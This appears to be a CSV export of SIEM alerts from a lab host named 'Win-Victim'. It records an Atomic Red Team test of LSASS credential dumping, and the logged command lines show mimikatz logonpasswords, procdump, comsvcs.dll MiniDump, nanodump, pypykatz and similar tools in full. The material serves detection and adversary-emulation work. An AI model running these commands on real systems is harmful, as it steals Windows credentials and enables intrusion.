timestamp,agent.name,rule.description,rule.level,rule.id,data.win.eventdata.commandLine,data.win.eventdata.image,data.win.eventdata.parentImage,data.win.system.computer
"Jun 19, 2026 @ 10:56:23.676",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\x64\\mimikatz.exe\"" \""sekurlsa::minidump %%tmp%%\\lsass.DMP\"" \""sekurlsa::logonpasswords full\"" exit",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:56:23.673",Win-Victim,Suspicious Windows cmd shell execution,3,92032,"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\nanodump.x64.exe  -w \""C:\\Users\\anshio\\AppData\\Local\\Temp\\nanodump.dmp\""",C:\\AtomicRedTeam\\ExternalPayloads\\nanodump.x64.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:56:23.671",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\nanodump.x64.exe -w \""%%temp%%\\nanodump.dmp\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:56:22.637",Win-Victim,Suspicious Windows cmd shell execution,3,92032,C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\Outflank-Dumpert.exe,C:\\AtomicRedTeam\\ExternalPayloads\\Outflank-Dumpert.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:56:22.636",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\Outflank-Dumpert.exe\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:56:21.355",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:56:20.127",Win-Victim,Suspicious Windows cmd shell execution,3,92032,C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\procdump.exe  -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp,C:\\AtomicRedTeam\\ExternalPayloads\\procdump.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:56:20.117",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\procdump.exe\"" -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:45:44.701",Win-Victim,Suspicious Windows cmd shell execution,3,92032,"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\nanodump.x64.exe  --silent-process-exit \""C:\\Users\\anshio\\AppData\\Local\\Temp\\SilentProcessExit\""",C:\\AtomicRedTeam\\ExternalPayloads\\nanodump.x64.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:45:44.690",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\nanodump.x64.exe --silent-process-exit \""%%temp%%\\SilentProcessExit\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:45:42.108",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {if (Test-Path -Path \\\""\""$env:SystemRoot\\System32\\rdrleakdiag.exe\\\""\"") {       $binary_path = \\\""\""$env:SystemRoot\\System32\\rdrleakdiag.exe\\\""\""   } elseif (Test-Path -Path \\\""\""$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\\\""\"") {       $binary_path = \\\""\""$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\\\""\""   } else {       $binary_path = \\\""\""File not found\\\""\""       exit 1   } $lsass_pid = get-process lsass |select -expand id if (-not (Test-Path -Path\\\""\""$env:TEMP\\t1003.001-13-rdrleakdiag\\\""\"")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force}  write-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1 &amp; $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1 Write-Host \\\""\""Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\t1003.001-13-rdrleakdiag directory.\\\""\""}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:45:42.094",Win-Victim,C:\\Windows\\Temp\\xordump.exe binary in a suspicious location launched by C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,4,92066,"\""C:\\Windows\\Temp\\xordump.exe\"" -out C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp -x 0x41",C:\\Windows\\Temp\\xordump.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:45:40.421",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {C:\\Windows\\Temp\\xordump.exe -out C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp -x 0x41}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:45:38.900",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {$exePath =  resolve-path \\\""\""$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\\\""\"" &amp; \\\""\""$exePath\\\""\"" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:45:31.817",Win-Victim,Suspicious Windows cmd shell execution,3,92032,C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\procdump.exe  -accepteula -mm lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp,C:\\AtomicRedTeam\\ExternalPayloads\\procdump.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:45:31.814",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\procdump.exe\"" -accepteula -mm lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:45:28.698",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"C:\\WINDOWS\\system32\\cmd.exe /c \""ver\""",C:\\Windows\\System32\\cmd.exe,C:\\Program Files\\Python310\\python.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:45:26.519",Win-Victim,Suspicious Windows cmd shell execution,3,92032,C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\venv_t1003_001\\Scripts\\pypykatz  live lsa,C:\\AtomicRedTeam\\ExternalPayloads\\venv_t1003_001\\Scripts\\pypykatz.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:45:24.797",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\venv_t1003_001\\Scripts\\pypykatz\"" live lsa",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:45:24.750",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\x64\\mimikatz.exe\"" \""sekurlsa::minidump %%tmp%%\\lsass.DMP\"" \""sekurlsa::logonpasswords full\"" exit",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:45:24.737",Win-Victim,Suspicious Windows cmd shell execution,3,92032,"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\nanodump.x64.exe  -w \""C:\\Users\\anshio\\AppData\\Local\\Temp\\nanodump.dmp\""",C:\\AtomicRedTeam\\ExternalPayloads\\nanodump.x64.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:45:24.735",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\nanodump.x64.exe -w \""%%temp%%\\nanodump.dmp\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:45:23.221",Win-Victim,Suspicious Windows cmd shell execution,3,92032,C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\Outflank-Dumpert.exe,C:\\AtomicRedTeam\\ExternalPayloads\\Outflank-Dumpert.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:45:23.219",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\Outflank-Dumpert.exe\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:45:20.877",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:45:19.655",Win-Victim,Suspicious Windows cmd shell execution,3,92032,C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\procdump.exe  -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp,C:\\AtomicRedTeam\\ExternalPayloads\\procdump.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:45:19.655",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\procdump.exe\"" -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:43:33.839",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {if (Test-Path C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\nanodump.x64.exe) {exit 0} else {exit 1}}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:43:32.104",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {if (Test-Path 'C:\\Windows\\Temp\\xordump.exe') {exit 0} else {exit 1}}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:43:26.144",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 Invoke-WebRequest \\\""\""https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\\\""\"" -OutFile C:\\Windows\\Temp\\xordump.exe}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:43:23.866",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {if (Test-Path 'C:\\Windows\\Temp\\xordump.exe') {exit 0} else {exit 1}}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:43:22.686",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {$exePath =  resolve-path \\\""\""$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\\\""\"" if ($exePath -and (Test-Path $exePath)) {exit 0} else {exit 1}}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:42:56.911",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {winget install Microsoft.DotNet.DesktopRuntime.5 --accept-source-agreements --accept-package-agreements --silent}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:42:55.384",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {$exePath =  resolve-path \\\""\""$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\\\""\"" if ($exePath -and (Test-Path $exePath)) {exit 0} else {exit 1}}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:42:54.122",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {if (Test-Path \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\procdump.exe\\\""\"") {exit 0} else {exit 1}}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:42:53.022",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {if (Get-Command \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\venv_t1003_001\\Scripts\\pypykatz\\\""\"" -errorAction SilentlyContinue) { exit 0 } else { exit 1 }}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:42:51.742",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {if (Test-Path -Path \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\venv_t1003_001\\\""\"") { exit 0 } else { exit 1 }}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:42:50.673",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:42:49.608",Win-Victim,Powershell process spawned Windows command shell instance,4,92004,"\""C:\\WINDOWS\\system32\\cmd.exe\"" /c \""if not exist %%tmp%%\\lsass.DMP (exit /b 1)\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:42:49.605",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {cmd /c \\\""\""if not exist %%tmp%%\\lsass.DMP (exit /b 1)\\\""\""}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:42:48.408",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {if (Test-Path \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\x64\\mimikatz.exe\\\""\"") {exit 0} else {exit 1}}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:42:47.163",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {if (Test-Path C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\nanodump.x64.exe) {exit 0} else {exit 1}}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:42:45.947",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {if (Test-Path \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\Outflank-Dumpert.exe\\\""\"") {exit 0} else {exit 1}}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:42:44.526",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {if (Test-Path \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\procdump.exe\\\""\"") {exit 0} else {exit 1}}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:41:45.790",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"C:\\WINDOWS\\system32\\cmd.exe /c \""ver\""",C:\\Windows\\System32\\cmd.exe,C:\\Program Files\\Python310\\python.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:41:44.390",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {&amp; \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\venv_t1003_001\\Scripts\\pip.exe\\\""\"" install --no-cache-dir pypykatz 2&gt;&amp;1 | Out-Null}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:41:43.363",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {if (Get-Command \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\venv_t1003_001\\Scripts\\pypykatz\\\""\"" -errorAction SilentlyContinue) { exit 0 } else { exit 1 }}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:41:42.007",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {if (Test-Path -Path \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\venv_t1003_001\\\""\"") { exit 0 } else { exit 1 }}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:41:36.725",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"C:\\WINDOWS\\system32\\cmd.exe /c \""ver\""",C:\\Windows\\System32\\cmd.exe,C:\\Program Files\\Python310\\python.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:41:35.492",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {py -m venv \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\venv_t1003_001\\\""\""}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:41:34.162",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {if (Test-Path -Path \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\venv_t1003_001\\\""\"") { exit 0 } else { exit 1 }}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:41:32.178",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:41:25.708",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"C:\\WINDOWS\\system32\\cmd.exe /c \""ver\""",C:\\Windows\\System32\\cmd.exe,C:\\Program Files\\Python310\\python.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:40:29.910",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {New-Item -Type Directory \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\\\\""\"" -ErrorAction ignore -Force | Out-Null invoke-webrequest \\\""\""https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\\\""\"" -outfile \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\python_setup.exe\\\""\"" Start-Process -FilePath \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\python_setup.exe\\\""\"" -ArgumentList \\\""\""/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\\\""\"" -Wait}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:40:28.760",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:40:28.745",Win-Victim,Powershell process spawned Windows command shell instance,4,92004,"\""C:\\WINDOWS\\system32\\cmd.exe\"" /c \""if not exist %%tmp%%\\lsass.DMP (exit /b 1)\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:40:27.605",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {cmd /c \\\""\""if not exist %%tmp%%\\lsass.DMP (exit /b 1)\\\""\""}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 10:40:26.044",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" &amp; {if (Test-Path \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\x64\\mimikatz.exe\\\""\"") {exit 0} else {exit 1}}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
